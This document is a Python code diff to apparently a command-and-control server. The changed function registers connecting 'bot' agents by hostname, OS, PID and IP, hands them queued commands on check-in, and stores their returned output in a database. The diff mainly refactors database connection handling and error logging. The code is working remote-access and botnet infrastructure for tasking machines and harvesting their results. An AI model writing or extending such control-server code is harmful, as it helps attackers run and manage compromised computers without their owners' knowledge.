@@ -6,7 +6,7 @@ from sys import exit, argv
 from ssl import wrap_socket
 from threading import Thread
 from server.logger import log_time
-from server.db import update_client, cmd_check, update_results
+from server.db import update_client, cmd_check, update_results, db_connect
 from server.config import CLIENT_PAGE, CLIENT_KEY, sock_close, sock_send, \
     sock_recv, EXTERNALIP, KEY_FILE, CERT_FILE, SSL_VERSION, cmd_decode, cmd_encode
 
@@ -88,17 +88,19 @@ class request_handler():
 ##################################################################
     def agent_handler(self, sock, request, remote_ip):
         # Main func to direct bot actions
+        con = db_connect()
         try:
             # Get Client ID in DB
-            id = update_client(remote_ip, request['Hostname'], request['OS'], 'Active', request['PID'], request['TYPE'], request['PROTOCOL'])
+            id = update_client(con, remote_ip, request['Hostname'], request['OS'], 'Active', request['PID'], request['TYPE'], request['PROTOCOL'])
             # Decode response data to perform checks, but leave encoded into DB
-            decoded_resp = cmd_decode(request['Data'])
+            decoded_resp = cmd_decode(request['Data']).strip()
             if "-debug" in argv:
                 print("[+] Response from {}({}): {}".format(request['Hostname'],request['PID'], decoded_resp.rstrip()))
 
             # Check if client in default state and CMD waiting for client
-            cmd = cmd_check(id)
+            cmd = cmd_check(con, id)
             if decoded_resp == "check-in" and cmd:
+                if "-debug" in argv: print("[->] Sending command to client")
                 self.send_cmd(sock, cmd)
 
             # Send OK (Default)
@@ -108,17 +110,24 @@ class request_handler():
             # If "[Client] Close." response, set as inactive in database
             elif decoded_resp == "{} Closed.".format(request['Hostname']):
                 try:
-                    update_results(id, request['Data'])
-                    update_client(remote_ip, request['Hostname'], request['OS'], 'Inactive', request['PID'], request['TYPE'],request['PROTOCOL'])
+                    update_results(con, id, request['Data'])
+                    update_client(con, remote_ip, request['Hostname'], request['OS'], 'Inactive', request['PID'], request['TYPE'],request['PROTOCOL'])
+
                 except Exception as e:
-                    print(e)
+                    update_results(con, id, cmd_encode(str(e)))
+                    update_client(con, remote_ip, request['Hostname'], request['OS'], 'Inactive', request['PID'], request['TYPE'], request['PROTOCOL'])
 
             # Handle client results from recent CMD
-            else:
-                update_results(id, request['Data'])
+            elif decoded_resp != "check-in":
+                update_results(con, id, request['Data'])
                 return self.get_200(sock)
+
         except Exception as e:
+            print(e)
             self.get_200(sock)
+
+        finally:
+            con.close()
 
 ##################################################################
 #
